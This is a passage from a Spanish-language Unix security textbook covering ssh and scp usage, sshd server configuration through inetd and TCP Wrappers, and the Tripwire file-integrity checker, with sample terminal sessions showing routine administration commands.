<!--l. 913--><para>Como hemos podido ver, ssh se utiliza b&#x00E1;sicamente para iniciar sesiones o ejecutar comandos en un sistema
remoto; el otro programa cliente, scp, es utilizado para transferir &#xFB01;cheros entre m&#x00E1;quinas, de una forma
similar a rcp, lo que por ejemplo permite sustituir el ftp tradicional por este mecanismo. Si por ejemplo
deseamos copiar todos los &#xFB01;cheros del directorio /export/home/toni/ conectando al sistema remoto bajo
el nombre de usuario toni en el directorio /tmp/ de la m&#x00E1;quina local, lo podemos conseguir con una orden
como esta:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;scp&#x00A0;-r&#x00A0;toni@anita:/export/home/toni/&#x00A0;/tmp/
&#x00A0;toni&#x2019;s&#x00A0;password:
&#x00A0;luisa:~#
</literallayout>
<!--l. 928--><para>Como podemos ver, estamos indicando el nombre de usuario y el del sistema remotos separados por &#x2018;@&#x2019;, y
separados a su vez de la ruta origen por el signo &#x2018;:&#x2019;.
<!--br/-->
<!--br/-->Pero, &#x00BF;qu&#x00E9; es lo que realmente hace cualquiera de estos clientes contra el servidor sshd? Si no indicamos lo
contrario con la opci&#x00F3;n &#x2018;-p&#x2019;, el cliente conecta al puerto 22 de la m&#x00E1;quina servidora y veri&#xFB01;ca que
esta m&#x00E1;quina es realmente con la que queremos conectar, intercambia las claves de cifrado
entre sistemas (cifradas a su vez, para evitar que un atacante pueda obtener la informaci&#x00F3;n) y
autentica utilizando .rhosts y /etc/hosts.equiv (como los protocolos r-<informalequation><graphic 
fileref="unixsec535x.gif"></graphic></informalequation>), RSA o claves de
usuario; si todo es correcto, el servidor asigna una terminal virtual (generalmente) a la conexi&#x00F3;n y
lanza un shell interactivo. Podemos ver con detalle este proceso utilizando la opci&#x00F3;n &#x2018;-v&#x2019; del
cliente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;ssh&#x00A0;-v&#x00A0;-l&#x00A0;toni&#x00A0;luisa
&#x00A0;SSH&#x00A0;Version&#x00A0;1.2.21&#x00A0;[i486-unknown-linux],&#x00A0;protocol&#x00A0;version&#x00A0;1.5.
&#x00A0;Standard&#x00A0;version.&#x00A0;&#x00A0;Does&#x00A0;not&#x00A0;use&#x00A0;RSAREF.
&#x00A0;luisa:&#x00A0;Reading&#x00A0;configuration&#x00A0;data&#x00A0;/etc/ssh&#x005F;config
&#x00A0;luisa:&#x00A0;ssh&#x005F;connect:&#x00A0;getuid&#x00A0;0&#x00A0;geteuid&#x00A0;0&#x00A0;anon&#x00A0;0
&#x00A0;luisa:&#x00A0;Connecting&#x00A0;to&#x00A0;luisa&#x00A0;[192.168.0.2]&#x00A0;port&#x00A0;22.
&#x00A0;luisa:&#x00A0;Allocated&#x00A0;local&#x00A0;port&#x00A0;1023.
&#x00A0;luisa:&#x00A0;Connection&#x00A0;established.
&#x00A0;luisa:&#x00A0;Remote&#x00A0;protocol&#x00A0;version&#x00A0;1.5,&#x00A0;remote&#x00A0;software&#x00A0;version&#x00A0;1.2.21
&#x00A0;luisa:&#x00A0;Waiting&#x00A0;for&#x00A0;server&#x00A0;public&#x00A0;key.
&#x00A0;luisa:&#x00A0;Received&#x00A0;server&#x00A0;public&#x00A0;key&#x00A0;(768&#x00A0;bits)&#x00A0;and&#x00A0;host&#x00A0;key&#x00A0;(1024&#x00A0;bits).
&#x00A0;luisa:&#x00A0;Host&#x00A0;&#x2019;luisa&#x2019;&#x00A0;is&#x00A0;known&#x00A0;and&#x00A0;matches&#x00A0;the&#x00A0;host&#x00A0;key.
&#x00A0;luisa:&#x00A0;Initializing&#x00A0;random;&#x00A0;seed&#x00A0;file&#x00A0;/root/.ssh/random&#x005F;seed
&#x00A0;luisa:&#x00A0;Encryption&#x00A0;type:&#x00A0;idea
&#x00A0;luisa:&#x00A0;Sent&#x00A0;encrypted&#x00A0;session&#x00A0;key.
&#x00A0;luisa:&#x00A0;Received&#x00A0;encrypted&#x00A0;confirmation.
&#x00A0;luisa:&#x00A0;Trying&#x00A0;rhosts&#x00A0;or&#x00A0;/etc/hosts.equiv&#x00A0;with&#x00A0;RSA&#x00A0;host&#x00A0;authentication.
&#x00A0;luisa:&#x00A0;Remote:&#x00A0;Rhosts/hosts.equiv&#x00A0;authentication&#x00A0;refused:&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;client&#x00A0;user&#x00A0;&#x2019;root&#x2019;,&#x00A0;server&#x00A0;user&#x00A0;&#x2019;toni&#x2019;,&#x00A0;client&#x00A0;host&#x00A0;&#x2019;luisa&#x2019;.
&#x00A0;luisa:&#x00A0;Server&#x00A0;refused&#x00A0;our&#x00A0;rhosts&#x00A0;authentication&#x00A0;or&#x00A0;host&#x00A0;key.
&#x00A0;luisa:&#x00A0;No&#x00A0;agent.
&#x00A0;luisa:&#x00A0;Doing&#x00A0;password&#x00A0;authentication.
&#x00A0;toni&#x2019;s&#x00A0;password:
&#x00A0;luisa:&#x00A0;Requesting&#x00A0;pty.
&#x00A0;luisa:&#x00A0;Failed&#x00A0;to&#x00A0;get&#x00A0;local&#x00A0;xauth&#x00A0;data.
&#x00A0;luisa:&#x00A0;Requesting&#x00A0;X11&#x00A0;forwarding&#x00A0;with&#x00A0;authentication&#x00A0;spoofing.
&#x00A0;luisa:&#x00A0;Requesting&#x00A0;shell.
&#x00A0;luisa:&#x00A0;Entering&#x00A0;interactive&#x00A0;session.
&#x00A0;Last&#x00A0;login:&#x00A0;Thu&#x00A0;Apr&#x00A0;&#x00A0;6&#x00A0;04:13:41&#x00A0;2000&#x00A0;from&#x00A0;luisa
&#x00A0;Linux&#x00A0;2.2.6
&#x00A0;If&#x00A0;you&#x00A0;want&#x00A0;divine&#x00A0;justice,&#x00A0;die.
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;--&#x00A0;Nick&#x00A0;Seldon
&#x00A0;
&#x00A0;luisa:~$&#x00A0;exit
&#x00A0;logout
&#x00A0;Connection&#x00A0;to&#x00A0;luisa&#x00A0;closed.
&#x00A0;luisa:&#x00A0;Transferred:&#x00A0;stdin&#x00A0;5,&#x00A0;stdout&#x00A0;491,&#x00A0;stderr&#x00A0;29&#x00A0;bytes&#x00A0;in&#x00A0;2.6&#x00A0;seconds
&#x00A0;luisa:&#x00A0;Bytes&#x00A0;per&#x00A0;second:&#x00A0;stdin&#x00A0;1.9,&#x00A0;stdout&#x00A0;189.0,&#x00A0;stderr&#x00A0;11.2
&#x00A0;luisa:&#x00A0;Exit&#x00A0;status&#x00A0;0
&#x00A0;luisa:~#
</literallayout>
<!--l. 987--><para>Como sucede en cualquier programa cliente&#x2013;servidor, la con&#xFB01;guraci&#x00F3;n de la parte cliente es mucho m&#x00E1;s sencilla
que la de la parte servidora: ni siquiera es necesario el &#xFB01;chero de con&#xFB01;guraci&#x00F3;n general /etc/ssh<informalequation><graphic 
fileref="unixsec536x.gif"></graphic></informalequation>config,
donde se de&#xFB01;nen par&#x00E1;metros por defecto (que cada usuario puede modi&#xFB01;car para s&#x02CA;&#x0131; mismo en sus
propios &#xFB01;cheros o en l&#x02CA;&#x0131;nea de &#x00F3;rdenes). S&#x00F3;lamente necesitamos el ejecutable (por ejemplo, ssh),
que generar&#x00E1; en el directorio $HOME/.ssh de quien lo ejecute varios &#xFB01;cheros necesarios para su
funcionamiento; quiz&#x00E1;s el m&#x00E1;s importante sea known<informalequation><graphic 
fileref="unixsec537x.gif"></graphic></informalequation>hosts, donde se almacenan las claves p&#x00FA;blicas de los
diferentes sistemas a los que se conecta. Estas claves, una por l&#x02CA;&#x0131;nea, se guardan la primera vez
que se conecta a una determinada m&#x00E1;quina, algo que el cliente indica con un mensaje de esta
forma:

     </para><literallayout role="verbatim">
&#x00A0;rosita:~#&#x00A0;ssh&#x00A0;-l&#x00A0;toni&#x00A0;luisa
&#x00A0;Host&#x00A0;key&#x00A0;not&#x00A0;found&#x00A0;from&#x00A0;the&#x00A0;list&#x00A0;of&#x00A0;known&#x00A0;hosts.
&#x00A0;Are&#x00A0;you&#x00A0;sure&#x00A0;you&#x00A0;want&#x00A0;to&#x00A0;continue&#x00A0;connecting&#x00A0;(yes/no)?&#x00A0;yes
&#x00A0;Host&#x00A0;&#x2019;luisa&#x2019;&#x00A0;added&#x00A0;to&#x00A0;the&#x00A0;list&#x00A0;of&#x00A0;known&#x00A0;hosts.
&#x00A0;toni&#x2019;s&#x00A0;password:
&#x00A0;Last&#x00A0;login:&#x00A0;Thu&#x00A0;Apr&#x00A0;&#x00A0;6&#x00A0;23:20:42&#x00A0;2000&#x00A0;from&#x00A0;:0.0
&#x00A0;Linux&#x00A0;2.2.6
&#x00A0;Drive&#x00A0;defensively.&#x00A0;&#x00A0;Buy&#x00A0;a&#x00A0;tank.
&#x00A0;
&#x00A0;luisa:~$
</literallayout>
<!--l. 1014--><para>Por su parte, la con&#xFB01;guraci&#x00F3;n del servidor es algo m&#x00E1;s compleja; en el archivo /etc/sshd<informalequation><graphic 
fileref="unixsec538x.gif"></graphic></informalequation>config, &#xFB01;chero de
con&#xFB01;guraci&#x00F3;n del demonio sshd, se especi&#xFB01;can todos los par&#x00E1;metros necesarios para su funcionamiento.
Algunos de estos par&#x00E1;metros, quiz&#x00E1;s los m&#x00E1;s &#x00FA;tiles, son AllowHosts y DenyHosts, donde como su nombre
indica se referencian los sistemas desde los que la conexi&#x00F3;n a nuestro demonio se permite o se deniega; al
contrario de lo que mucha gente sigue pensando, utilizar SSH no implica tener disponible el servicio para
todo el mundo, y es aqu&#x02CA;&#x0131; donde indicamos los sistemas desde donde permitimos conexiones. Adem&#x00E1;s,
podemos servir sshd desde inetd modi&#xFB01;cando convenientemente /etc/inetd.conf en lugar de
hacerlo como demonio independiente, de forma que podemos aprovechar un software como TCP
Wrappers para restringir conexiones; el &#x00FA;nico inconveniente de este modelo es que cada vez que
alguien conecta al demonio &#x00E9;ste tiene que generar una clave RSA para esa conexi&#x00F3;n, lo que en
determinadas situaciones puede sobrecargar demasiado al sistema. Si de cualquier forma queremos
seguir este mecanismo, hemos de modi&#xFB01;car /etc/services para a~nadir una l&#x02CA;&#x0131;nea como la
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;ssh&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;22/tcp
</literallayout>
<!--l. 1036--><para>Y tambi&#x00E9;n modi&#xFB01;caremos /etc/inetd.conf a~nadiendo la con&#xFB01;guraci&#x00F3;n del nuevo servicio:

     </para><literallayout role="verbatim">
&#x00A0;ssh&#x00A0;&#x00A0;stream&#x00A0;&#x00A0;tcp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nowait&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/sbin/tcpd&#x00A0;/usr/local/sbin/sshd&#x00A0;-i
</literallayout>
<!--l. 1043--><para>Tras lo cual, como cada vez que modi&#xFB01;camos este archivo, hemos de conseguir que inetd lo relea envi&#x00E1;ndole
al demonio la se~nal SIGHUP.
  </para></section><!--end section--><!--l. 1045--><section 
role="section"><title><abbrev role="title-mark">21.5</abbrev><anchor 
   id="x1-32800021.5"  ></anchor>Tripwire</title>
<!--l. 1046--><para>  La herramienta Tripwire (<citation>[?]</citation>), <citation>[?]</citation>) es un comprobador de integridad para &#xFB01;cheros y directorios de
sistemas Unix: compara un conjunto de estos objetos con la informaci&#x00F3;n sobre los mismos almacenada
previamente en una base de datos, y alerta al administrador en caso de que algo haya cambiado. La idea es
simple: se crea un resumen de cada &#xFB01;chero o directorio importante para nuestra seguridad nada m&#x00E1;s
instalar el sistema, y esos res&#x00FA;menes se almacenan en un medio seguro (un CD-ROM o un disco protegido
contra escritura), de forma que si alguno de los &#xFB01;cheros es modi&#xFB01;cado (por ejemplo, por un atacante que
sustituye un programa por una versi&#x00F3;n troyanizada o a~nade una entrada en nuestro &#xFB01;chero de
contrase~nas) Tripwire nos alertar&#x00E1; la pr&#x00F3;xima vez que realicemos la comprobaci&#x00F3;n. Para generar esos
res&#x00FA;menes se utilizan funciones hash, de forma que es casi imposible que dos &#xFB01;cheros generen
el mismo resumen; concretamente Tripwire implementa MD2, MD4, MD5, Snefru, CRC-16 y
CRC-32.
<!--br/-->
<!--br/-->Una vez hemos compilado el c&#x00F3;digo fuente de Tripwire debemos inicializar la base de datos; para ello
necesitamos en primer lugar crear el &#xFB01;chero tw.config en la localizaci&#x00F3;n indicada en include/config.h,
donde espedi&#xFB01;caremos los directorios a analizar (en el directorio configs/ tenemos algunos &#xFB01;cheros de
ejemplo, adecuados a diferentes plataformas Unix). A continuaci&#x00F3;n inicializaremos la base de datos con la
orden tripwire -initialize (o simplemente -init):

     </para><literallayout role="verbatim">
&#x00A0;anita:/tmp/tripwire-1.2/src#&#x00A0;./tripwire&#x00A0;-init
&#x00A0;###&#x00A0;Phase&#x00A0;1:&#x00A0;&#x00A0;&#x00A0;Reading&#x00A0;configuration&#x00A0;file
&#x00A0;###&#x00A0;Phase&#x00A0;2:&#x00A0;&#x00A0;&#x00A0;Generating&#x00A0;file&#x00A0;list
&#x00A0;###&#x00A0;Phase&#x00A0;3:&#x00A0;&#x00A0;&#x00A0;Creating&#x00A0;file&#x00A0;information&#x00A0;database
&#x00A0;###
&#x00A0;###&#x00A0;Warning:&#x00A0;&#x00A0;&#x00A0;Database&#x00A0;file&#x00A0;placed&#x00A0;in&#x00A0;./databases/tw.db&#x005F;anita.
&#x00A0;###
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Make&#x00A0;sure&#x00A0;to&#x00A0;move&#x00A0;this&#x00A0;file&#x00A0;file&#x00A0;and&#x00A0;the&#x00A0;configuration
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;to&#x00A0;secure&#x00A0;media!
&#x00A0;###
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;(Tripwire&#x00A0;expects&#x00A0;to&#x00A0;find&#x00A0;it&#x00A0;in&#x00A0;&#x2019;/usr/local/tw&#x2019;.)
&#x00A0;anita:/tmp/tripwire-1.2/src#
</literallayout>
<!--l. 1085--><para>En el &#xFB01;chero ./databases/tw.db<informalequation><graphic 
fileref="unixsec539x.gif"></graphic></informalequation>anita se encuentran las funciones resumen de los archivos y
directorios especi&#xFB01;cados en tw.config; evidentemente, los datos de ese &#xFB01;chero se asumen como
&#xFB01;ables, por lo que es recomendable generarlo antes de abrir la m&#x00E1;quina a los usuarios, nada m&#x00E1;s
instalar el operativo. Adem&#x00E1;s, si un usuario lo consigue modi&#xFB01;car toda la seguridad de Tripwire
se rompe, as&#x02CA;&#x0131; que deberemos almacenarlo en un medio seguro (por ejemplo, de s&#x00F3;lo lectura),
e incluso imprimir en papel una copia para realizar comprobaciones si sospechamos de un
ataque.
<!--br/-->
<!--br/-->Con la base de datos inicial ya generada, podemos ejecutar regularmente Tripwire para veri&#xFB01;car que no ha
cambiado ning&#x00FA;n resumen de nuestros &#xFB01;chero; para ello es necesario utilizar dicha base de datos desde una
fuente segura (por ejemplo, reci&#x00E9;n copiada desde el medio de s&#x00F3;lo lectura al disco, en modo
monousuario):

     </para><literallayout role="verbatim">
&#x00A0;anita:/tmp/tripwire-1.2/src#&#x00A0;./tripwire&#x00A0;&#x0026;&#x003E;resultados
&#x00A0;anita:/tmp/tripwire-1.2/src#&#x00A0;head&#x00A0;-17&#x00A0;resultados
&#x00A0;###&#x00A0;Phase&#x00A0;1:&#x00A0;&#x00A0;&#x00A0;Reading&#x00A0;configuration&#x00A0;file
&#x00A0;###&#x00A0;Phase&#x00A0;2:&#x00A0;&#x00A0;&#x00A0;Generating&#x00A0;file&#x00A0;list
&#x00A0;###&#x00A0;Phase&#x00A0;3:&#x00A0;&#x00A0;&#x00A0;Creating&#x00A0;file&#x00A0;information&#x00A0;database
&#x00A0;###&#x00A0;Phase&#x00A0;4:&#x00A0;&#x00A0;&#x00A0;Searching&#x00A0;for&#x00A0;inconsistencies
&#x00A0;###
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Total&#x00A0;files&#x00A0;scanned:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;4821
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Files&#x00A0;added:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;2
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Files&#x00A0;deleted:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Files&#x00A0;changed:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;4413
&#x00A0;###
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;After&#x00A0;applying&#x00A0;rules:
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Changes&#x00A0;discarded:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;3959
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Changes&#x00A0;remaining:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;458
&#x00A0;###
&#x00A0;added:&#x00A0;&#x00A0;&#x00A0;-rw-------&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;May&#x00A0;&#x00A0;5&#x00A0;03:46:06&#x00A0;2000&#x00A0;/var/tmp/test
&#x00A0;changed:&#x00A0;-rw-r--r--&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;972&#x00A0;May&#x00A0;&#x00A0;5&#x00A0;03:49:53&#x00A0;2000&#x00A0;/var/adm/utmp
&#x00A0;changed:&#x00A0;-rw-r--r--&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;10044&#x00A0;May&#x00A0;&#x00A0;5&#x00A0;03:49:53&#x00A0;2000&#x00A0;/var/adm/utmpx
&#x00A0;anita:/tmp/tripwire-1.2/src#
</literallayout>
<!--l. 1122--><para>Finalmente, debemos pensar que existir&#x00E1;n &#xFB01;cheros o directorios que van a cambiar habitualmente (por
ejemplo, el archivo de contrase~nas cada vez que a~nadamos a un usuario al sistema); por tanto, es l&#x00F3;gico que
Tripwire ofrezca un mecanismo de actualizaci&#x00F3;n de la base de datos. Es m&#x00E1;s, este programa posee dos: o bien
el modo interactivo o el modo actualizaci&#x00F3;n. En el primero, cada vez que Tripwire detecte un &#xFB01;chero con
modi&#xFB01;caciones nos consultar&#x00E1; si deseamos actualizar nuestra base de datos, mientras que en el modo update
se utiliza para la actualizaci&#x00F3;n o bien un nombre de archivo (si es lo &#x00FA;nico modi&#xFB01;cado) o bien un
directorio pasado como par&#x00E1;metro al ejecutable. El modo interactivo se invocado mediante la opci&#x00F3;n
-interactive:

     </para><literallayout role="verbatim">
&#x00A0;anita:/tmp/tripwire-1.2/src#&#x00A0;./tripwire&#x00A0;-interactive
&#x00A0;###&#x00A0;Phase&#x00A0;1:&#x00A0;&#x00A0;&#x00A0;Reading&#x00A0;configuration&#x00A0;file
&#x00A0;###&#x00A0;Phase&#x00A0;2:&#x00A0;&#x00A0;&#x00A0;Generating&#x00A0;file&#x00A0;list
&#x00A0;###&#x00A0;Phase&#x00A0;3:&#x00A0;&#x00A0;&#x00A0;Creating&#x00A0;file&#x00A0;information&#x00A0;database
&#x00A0;###&#x00A0;Phase&#x00A0;4:&#x00A0;&#x00A0;&#x00A0;Searching&#x00A0;for&#x00A0;inconsistencies
&#x00A0;###
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Total&#x00A0;files&#x00A0;scanned:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;4820
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Files&#x00A0;added:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;1
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Files&#x00A0;deleted:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Files&#x00A0;changed:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;4413
&#x00A0;###
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;After&#x00A0;applying&#x00A0;rules:
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Changes&#x00A0;discarded:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;3958
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Changes&#x00A0;remaining:&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;457
&#x00A0;###
&#x00A0;added:&#x00A0;&#x00A0;&#x00A0;-rw-------&#x00A0;toni&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;May&#x00A0;&#x00A0;5&#x00A0;03:55:29&#x00A0;2000&#x00A0;/var/tmp/Rx0000755
&#x00A0;---&#x003E;&#x00A0;File:&#x00A0;&#x2019;/var/tmp/Rx0000755&#x2019;
&#x00A0;---&#x003E;&#x00A0;Update&#x00A0;entry?&#x00A0;&#x00A0;[YN(y)nh?]
</literallayout>
<!--l. 1155--><para>Mientras que el modo update se consigue mediante el par&#x00E1;metro -update; por ejemplo, si hemos a~nadido a un
usuario (y por tanto modi&#xFB01;cado los &#xFB01;cheros /etc/passwd y /etc/shadow), actualizaremos la base de datos
de Tripwire con la siguiente orden:

     </para><literallayout role="verbatim">
&#x00A0;anita:/tmp/tripwire-1.2/src#&#x00A0;./tripwire&#x00A0;-update&#x00A0;/etc/passwd&#x00A0;/etc/shadow
&#x00A0;###&#x00A0;Phase&#x00A0;1:&#x00A0;&#x00A0;&#x00A0;Reading&#x00A0;configuration&#x00A0;file
&#x00A0;###&#x00A0;Phase&#x00A0;2:&#x00A0;&#x00A0;&#x00A0;Generating&#x00A0;file&#x00A0;list
&#x00A0;Updating:&#x00A0;update&#x00A0;file:&#x00A0;/etc/passwd
&#x00A0;Updating:&#x00A0;update&#x00A0;file:&#x00A0;/etc/shadow
&#x00A0;###&#x00A0;Phase&#x00A0;3:&#x00A0;&#x00A0;&#x00A0;Updating&#x00A0;file&#x00A0;information&#x00A0;database
&#x00A0;###
&#x00A0;###&#x00A0;Old&#x00A0;database&#x00A0;file&#x00A0;will&#x00A0;be&#x00A0;moved&#x00A0;to&#x00A0;&#x2018;tw.db&#x005F;anita.old&#x2019;
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;in&#x00A0;./databases.
&#x00A0;###
&#x00A0;###&#x00A0;Updated&#x00A0;database&#x00A0;will&#x00A0;be&#x00A0;stored&#x00A0;in&#x00A0;&#x2019;./databases/tw.db&#x005F;anita&#x2019;
&#x00A0;###&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;(Tripwire&#x00A0;expects&#x00A0;it&#x00A0;to&#x00A0;be&#x00A0;moved&#x00A0;to&#x00A0;&#x2019;/usr/local/tw&#x2019;.)
&#x00A0;###
&#x00A0;anita:/tmp/tripwire-1.2/src#
</literallayout>
<!--l. 1177--><para>Tripwire es una herramienta muy &#x00FA;til como sistema de detecci&#x00F3;n de intrusos (<citation>[?]</citation>) en nuestras m&#x00E1;quinas Unix;
ejecutarlo peri&#x00F3;dicamente, y mantener segura la base de datos de res&#x00FA;menes &#x2013; donde recordemos que reside
